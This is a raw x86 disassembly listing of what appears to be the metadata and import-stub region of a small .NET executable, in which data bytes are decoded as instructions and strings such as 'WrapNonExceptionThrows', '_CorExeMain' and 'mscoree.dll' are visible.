  40a1b3:	1d 12 15 1d 02       	sbb    $0x21d1512,%eax
  40a1b8:	06                   	push   %es
  40a1b9:	00 03                	add    %al,(%ebx)
  40a1bb:	02 1c 1c             	add    (%esp,%ebx,1),%bl
  40a1be:	02 04 20             	add    (%eax,%eiz,1),%al
  40a1c1:	01 02                	add    %eax,(%edx)
  40a1c3:	0e                   	push   %cs
  40a1c4:	16                   	push   %ss
  40a1c5:	07                   	pop    %es
  40a1c6:	0a 12                	or     (%edx),%dl
  40a1c8:	15 1c 0e 12 80       	adc    $0x80120e1c,%eax
  40a1cd:	99                   	cltd
  40a1ce:	08 1d 12 15 08 1d    	or     %bl,0x1d081512
  40a1d4:	12 81 ad 1d 1c 1d    	adc    0x1d1c1dad(%ecx),%al
  40a1da:	1c 05                	sbb    $0x5,%al
  40a1dc:	00 01                	add    %al,(%ecx)
  40a1de:	11 39                	adc    %edi,(%ecx)
  40a1e0:	0d 04 20 00 11       	or     $0x11002004,%eax
  40a1e5:	39 07                	cmp    %eax,(%edi)
  40a1e7:	00 02                	add    %al,(%edx)
  40a1e9:	02 11                	add    (%ecx),%dl
  40a1eb:	39 11                	cmp    %edx,(%ecx)
  40a1ed:	39 14 07             	cmp    %edx,(%edi,%eax,1)
  40a1f0:	09 12                	or     %edx,(%edx)
  40a1f2:	4c                   	dec    %esp
  40a1f3:	12 81 c1 08 11 39    	adc    0x391108c1(%ecx),%al
  40a1f9:	12 2d 08 12 80 99    	adc    0x99801208,%ch
  40a1ff:	1d 03 1d 0e 06       	sbb    $0x60e1d03,%eax
  40a204:	15 12 81 c5 01       	adc    $0x1c58112,%eax
  40a209:	0e                   	push   %cs
  40a20a:	05 20 01 01 13       	add    $0x13010120,%eax
  40a20f:	00 06                	add    %al,(%esi)
  40a211:	00 00                	add    %al,(%eax)
  40a213:	1d 12 81 7d 07       	sbb    $0x77d8112,%eax
  40a218:	15 12 81 c9 02       	adc    $0x2c98112,%eax
  40a21d:	0e                   	push   %cs
  40a21e:	02 13                	add    (%ebx),%dl
  40a220:	10 01                	adc    %al,(%ecx)
  40a222:	02 02                	add    (%edx),%al
  40a224:	15 12 81 d1 01       	adc    $0x1d18112,%eax
  40a229:	1e                   	push   %ds
  40a22a:	00 15 12 81 c9 02    	add    %dl,0x2c98112
  40a230:	1e                   	push   %ds
  40a231:	00 02                	add    %al,(%edx)
  40a233:	03 0a                	add    (%edx),%ecx
  40a235:	01 0e                	add    %ecx,(%esi)
  40a237:	15 07 08 08 1c       	adc    $0x1c080807,%eax
  40a23c:	15 12 81 c5 01       	adc    $0x1c58112,%eax
  40a241:	0e                   	push   %cs
  40a242:	12 81 7d 08 1d 0e    	adc    0xe1d087d(%ecx),%al
  40a248:	08 1d 12 81 7d 06    	or     %bl,0x67d8112
  40a24e:	00 01                	add    %al,(%ecx)
  40a250:	12 81 dd 0e 04 20    	adc    0x20040edd(%ecx),%al
  40a256:	01 08                	add    %ecx,(%eax)
  40a258:	08 05 20 00 12 81    	or     %al,0x81120020
  40a25e:	e1 08                	loope  0x40a268
  40a260:	07                   	pop    %es
  40a261:	02 12                	add    (%edx),%dl
  40a263:	81 d5 12 81 d9 09    	adc    $0x9d98112,%ebp
  40a269:	07                   	pop    %es
  40a26a:	05 02 08 0e 12       	add    $0x120e0802,%eax
  40a26f:	80 99 0e 06 20 01 01 	sbbb   $0x1,0x120060e(%ecx)
  40a276:	11 81 e9 08 00 01    	adc    %eax,0x10008e9(%ecx)
  40a27c:	12 81 7d 12 81 e5    	adc    -0x1a7eed83(%ecx),%al
  40a282:	0f 07                	sysret
  40a284:	06                   	push   %es
  40a285:	1c 12                	sbb    $0x12,%al
  40a287:	81 7d 12 81 e5 1d 1c 	cmpl   $0x1c1de581,0x12(%ebp)
  40a28e:	1d 1c 1d 02 05       	sbb    $0x5021d1c,%eax
  40a293:	20 00                	and    %al,(%eax)
  40a295:	12 81 ad 06 20 00    	adc    0x2006ad(%ecx),%al
  40a29b:	1d 12 81 f1 06       	sbb    $0x6f18112,%eax
  40a2a0:	20 02                	and    %al,(%edx)
  40a2a2:	1c 1c                	sbb    $0x1c,%al
  40a2a4:	1d 1c 0f 07 06       	sbb    $0x6070f1c,%eax
  40a2a9:	1c 12                	sbb    $0x12,%al
  40a2ab:	81 b5 1c 12 81 ad 1d 	xorl   $0x80121c1d,-0x527eede4(%ebp)
  40a2b2:	1c 12 80 
  40a2b5:	99                   	cltd
  40a2b6:	05 00 00 12 81       	add    $0x81120000,%eax
  40a2bb:	f5                   	cmc
  40a2bc:	05 20 01 1d 05       	add    $0x51d0120,%eax
  40a2c1:	0e                   	push   %cs
  40a2c2:	0a 20                	or     (%eax),%ah
  40a2c4:	04 08                	add    $0x8,%al
  40a2c6:	1d 05 08 08 11       	sbb    $0x11080805,%eax
  40a2cb:	80 dd 0c             	sbb    $0xc,%ch
  40a2ce:	07                   	pop    %es
  40a2cf:	05 1d 05 0e 12       	add    $0x120e051d,%eax
  40a2d4:	19 12                	sbb    %edx,(%edx)
  40a2d6:	80 99 1d 0e 06 20 01 	sbbb   $0x1,0x20060e1d(%ecx)
  40a2dd:	01 11                	add    %edx,(%ecx)
  40a2df:	82 01 01             	addb   $0x1,(%ecx)
  40a2e2:	22 0f                	and    (%edi),%cl
  40a2e4:	07                   	pop    %es
  40a2e5:	05 12 80 99 0e       	add    $0xe998012,%eax
  40a2ea:	12 82 05 12 80 99    	adc    -0x667fedfb(%edx),%al
  40a2f0:	12 81 e5 05 00 00    	adc    0x5e5(%ecx),%al
  40a2f6:	12 81 7d 06 07 02    	adc    0x207067d(%ecx),%al
  40a2fc:	18 12                	sbb    %dl,(%edx)
  40a2fe:	81 7d 04 00 01 18 08 	cmpl   $0x8180100,0x4(%ebp)
  40a305:	05 00 02 02 18       	add    $0x18020200,%eax
  40a30a:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40a30d:	01 08                	add    %ecx,(%eax)
  40a30f:	18 04 00             	sbb    %al,(%eax,%eax,1)
  40a312:	01 09                	add    %ecx,(%ecx)
  40a314:	1c 04                	sbb    $0x4,%al
  40a316:	00 01                	add    %al,(%ecx)
  40a318:	02 1c 04             	add    (%esp,%eax,1),%bl
  40a31b:	00 01                	add    %al,(%ecx)
  40a31d:	08 1c 05 20 02 01 0e 	or     %bl,0xe010220(,%eax,1)
  40a324:	02 05 00 02 02 1c    	add    0x1c020200,%al
  40a32a:	1c 0b                	sbb    $0xb,%al
  40a32c:	07                   	pop    %es
  40a32d:	07                   	pop    %es
  40a32e:	18 1c 1c             	sbb    %bl,(%esp,%ebx,1)
  40a331:	1c 1c                	sbb    $0x1c,%al
  40a333:	12 82 05 0e 09 07    	adc    0x7090e05(%edx),%al
  40a339:	06                   	push   %es
  40a33a:	0e                   	push   %cs
  40a33b:	09 18                	or     %ebx,(%eax)
  40a33d:	12 31                	adc    (%ecx),%dh
  40a33f:	1c 1c                	sbb    $0x1c,%al
  40a341:	06                   	push   %es
  40a342:	00 01                	add    %al,(%ecx)
  40a344:	12 81 7d 08 0a 07    	adc    0x70a087d(%ecx),%al
  40a34a:	06                   	push   %es
  40a34b:	0e                   	push   %cs
  40a34c:	09 18                	or     %ebx,(%eax)
  40a34e:	1c 1c                	sbb    $0x1c,%al
  40a350:	12 80 99 01 15 06    	adc    0x6150199(%eax),%al
  40a356:	20 01                	and    %al,(%ecx)
  40a358:	1d 05 1d 05 0c       	sbb    $0xc051d05,%eax
  40a35d:	00 05 01 12 82 31    	add    %al,0x31821201
  40a363:	08 12                	or     %dl,(%edx)
  40a365:	82 31 08             	xorb   $0x8,(%ecx)
  40a368:	08 05 20 01 01 1d    	or     %al,0x1d010120
  40a36e:	05 06 20 01 01       	add    $0x1012006,%eax
  40a373:	11 82 39 05 20 00    	adc    %eax,0x200539(%edx)
  40a379:	12 82 25 08 20 03    	adc    0x3200825(%edx),%al
  40a37f:	1d 05 1d 05 08       	sbb    $0x8051d05,%eax
  40a384:	08 13                	or     %dl,(%ebx)
  40a386:	07                   	pop    %es
  40a387:	08 12                	or     %dl,(%edx)
  40a389:	82 21 1d             	andb   $0x1d,(%ecx)
  40a38c:	05 1c 0e 12 82       	add    $0x82120e1c,%eax
  40a391:	25 1d 05 12 82       	and    $0x8212051d,%eax
  40a396:	29 1d 05 05 20 00    	sub    %ebx,0x200505
  40a39c:	12 82 3d 04 20 01    	adc    0x120043d(%edx),%al
  40a3a2:	01 0a                	add    %ecx,(%edx)
  40a3a4:	04 07                	add    $0x7,%al
  40a3a6:	01 1d 0e 06 00 01    	add    %ebx,0x100060e
  40a3ac:	11 82 45 0e 04 20    	adc    %eax,0x20040e45(%edx)
  40a3b2:	01 03                	add    %eax,(%ebx)
  40a3b4:	08 05 20 01 12 31    	or     %al,0x31120120
  40a3ba:	03 07                	add    (%edi),%eax
  40a3bc:	07                   	pop    %es
  40a3bd:	04 0e                	add    $0xe,%al
  40a3bf:	12 31                	adc    (%ecx),%dh
  40a3c1:	08 08                	or     %cl,(%eax)
  40a3c3:	06                   	push   %es
  40a3c4:	10 01                	adc    %al,(%ecx)
  40a3c6:	01 08                	add    %ecx,(%eax)
  40a3c8:	1e                   	push   %ds
  40a3c9:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40a3cc:	01 11                	add    %edx,(%ecx)
  40a3ce:	40                   	inc    %eax
  40a3cf:	06                   	push   %es
  40a3d0:	20 01                	and    %al,(%ecx)
  40a3d2:	11 39                	adc    %edi,(%ecx)
  40a3d4:	11 39                	adc    %edi,(%ecx)
  40a3d6:	04 07                	add    $0x7,%al
  40a3d8:	02 1c 08             	add    (%eax,%ecx,1),%bl
  40a3db:	06                   	push   %es
  40a3dc:	07                   	pop    %es
  40a3dd:	03 0e                	add    (%esi),%ecx
  40a3df:	12 31                	adc    (%ecx),%dh
  40a3e1:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40a3e4:	01 1d 05 05 20 01    	add    %ebx,0x1200505
  40a3ea:	0e                   	push   %cs
  40a3eb:	1d 05 05 07 02       	sbb    $0x2070505,%eax
  40a3f0:	0e                   	push   %cs
  40a3f1:	1d 1c 0e 07 07       	sbb    $0x7070e1c,%eax
  40a3f6:	1d 05 0e 12 82       	sbb    $0x82120e05,%eax
  40a3fb:	29 12                	sub    %edx,(%edx)
  40a3fd:	31 05 08 1d 05 04    	xor    %eax,0x4051d08
  40a403:	06                   	push   %es
  40a404:	12 81 91 09 20 02    	adc    0x2200991(%ecx),%al
  40a40a:	12 81 91 0e 11 82    	adc    -0x7deef16f(%ecx),%al
  40a410:	55                   	push   %ebp
  40a411:	08 20                	or     %ah,(%eax)
  40a413:	03 01                	add    (%ecx),%eax
  40a415:	0e                   	push   %cs
  40a416:	1c 11                	sbb    $0x11,%al
  40a418:	82 59 09 07          	sbbb   $0x7,0x9(%ecx)
  40a41c:	03 02                	add    (%edx),%eax
  40a41e:	12 81 91 12 80 99    	adc    -0x667fed6f(%ecx),%al
  40a424:	06                   	push   %es
  40a425:	20 01                	and    %al,(%ecx)
  40a427:	12 81 91 0e 0b 07    	adc    0x70b0e91(%ecx),%al
  40a42d:	04 1d                	add    $0x1d,%al
  40a42f:	05 12 81 91 1c       	add    $0x1c918112,%eax
  40a434:	12 80 99 06 00 02    	adc    0x2000699(%eax),%al
  40a43a:	1c 1c                	sbb    $0x1c,%al
  40a43c:	12 15 06 00 02 08    	adc    0x8020006,%dl
  40a442:	1d 05 08 09 20       	sbb    $0x20090805,%eax
  40a447:	02 01                	add    (%ecx),%al
  40a449:	12 81 3d 11 82 65    	adc    0x6582113d(%ecx),%al
  40a44f:	10 07                	adc    %al,(%edi)
  40a451:	09 1d 05 1c 1c 1d    	or     %ebx,0x1d1c1c05
  40a457:	05 1c 1c 1d 1c       	add    $0x1c1d1c1c,%eax
  40a45c:	1d 1c 1d 02 05       	sbb    $0x5021d1c,%eax
  40a461:	00 01                	add    %al,(%ecx)
  40a463:	1d 05 08 0d 07       	sbb    $0x70d0805,%eax
  40a468:	07                   	pop    %es
  40a469:	1d 05 1c 1c 1c       	sbb    $0x1c1c1c05,%eax
  40a46e:	1d 1c 1d 1c 1d       	sbb    $0x1d1c1d1c,%eax
  40a473:	02 12                	add    (%edx),%dl
  40a475:	07                   	pop    %es
  40a476:	06                   	push   %es
  40a477:	12 82 21 1d 05 12    	adc    0x12051d21(%edx),%al
  40a47d:	82 29 1d             	subb   $0x1d,(%ecx)
  40a480:	05 12 82 25 12       	add    $0x12258212,%eax
  40a485:	80 99 07 20 03 01 02 	sbbb   $0x2,0x1032007(%ecx)
  40a48c:	0e                   	push   %cs
  40a48d:	10 02                	adc    %al,(%edx)
  40a48f:	04 07                	add    $0x7,%al
  40a491:	02 02                	add    (%edx),%al
  40a493:	02 06                	add    (%esi),%al
  40a495:	20 01                	and    %al,(%ecx)
  40a497:	01 11                	add    %edx,(%ecx)
  40a499:	82 6d 01 08          	subb   $0x8,0x1(%ebp)
  40a49d:	08 01                	or     %al,(%ecx)
  40a49f:	00 08                	add    %cl,(%eax)
  40a4a1:	00 00                	add    %al,(%eax)
  40a4a3:	00 00                	add    %al,(%eax)
  40a4a5:	00 1e                	add    %bl,(%esi)
  40a4a7:	01 00                	add    %eax,(%eax)
  40a4a9:	01 00                	add    %eax,(%eax)
  40a4ab:	54                   	push   %esp
  40a4ac:	02 16                	add    (%esi),%dl
  40a4ae:	57                   	push   %edi
  40a4af:	72 61                	jb     0x40a512
  40a4b1:	70 4e                	jo     0x40a501
  40a4b3:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4b4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4b5:	45                   	inc    %ebp
  40a4b6:	78 63                	js     0x40a51b
  40a4b8:	65 70 74             	gs jo  0x40a52f
  40a4bb:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40a4c2:	77 73                	ja     0x40a537
  40a4c4:	01 29                	add    %ebp,(%ecx)
  40a4c6:	01 00                	add    %eax,(%eax)
  40a4c8:	24 33                	and    $0x33,%al
  40a4ca:	64 61                	fs popa
  40a4cc:	37                   	aaa
  40a4cd:	32 31                	xor    (%ecx),%dh
  40a4cf:	66 64 2d 32 31       	fs sub $0x3132,%ax
  40a4d4:	39 66 2d             	cmp    %esp,0x2d(%esi)
  40a4d7:	34 61                	xor    $0x61,%al
  40a4d9:	34 66                	xor    $0x66,%al
  40a4db:	2d 38 39 62 30       	sub    $0x30623938,%eax
  40a4e0:	2d 61 64 32 34       	sub    $0x34326461,%eax
  40a4e5:	39 39                	cmp    %edi,(%ecx)
  40a4e7:	35 61 64 33 63       	xor    $0x63336461,%eax
  40a4ec:	66 00 00             	data16 add %al,(%eax)
  40a4ef:	0c 01                	or     $0x1,%al
  40a4f1:	00 07                	add    %al,(%edi)
  40a4f3:	31 2e                	xor    %ebp,(%esi)
  40a4f5:	30 2e                	xor    %ch,(%esi)
  40a4f7:	30 2e                	xor    %ch,(%esi)
  40a4f9:	30 00                	xor    %al,(%eax)
  40a4fb:	00 24 a5 00 00 00 00 	add    %ah,0x0(,%eiz,4)
  40a502:	00 00                	add    %al,(%eax)
  40a504:	00 00                	add    %al,(%eax)
  40a506:	00 00                	add    %al,(%eax)
  40a508:	3e a5                	movsl  %ds:(%esi),%es:(%edi)
  40a50a:	00 00                	add    %al,(%eax)
  40a50c:	00 20                	add    %ah,(%eax)
	...
  40a522:	00 00                	add    %al,(%eax)
  40a524:	30 a5 00 00 00 00    	xor    %ah,0x0(%ebp)
	...
  40a532:	5f                   	pop    %edi
  40a533:	43                   	inc    %ebx
  40a534:	6f                   	outsl  %ds:(%esi),(%dx)
  40a535:	72 45                	jb     0x40a57c
  40a537:	78 65                	js     0x40a59e
  40a539:	4d                   	dec    %ebp
  40a53a:	61                   	popa
  40a53b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40a542:	72 65                	jb     0x40a5a9
  40a544:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40a548:	6c                   	insb   (%dx),%es:(%edi)
  40a549:	00 00                	add    %al,(%eax)
  40a54b:	00 00                	add    %al,(%eax)
  40a54d:	00 ff                	add    %bh,%bh
  40a54f:	25 00 20 40 00       	and    $0x402000,%eax
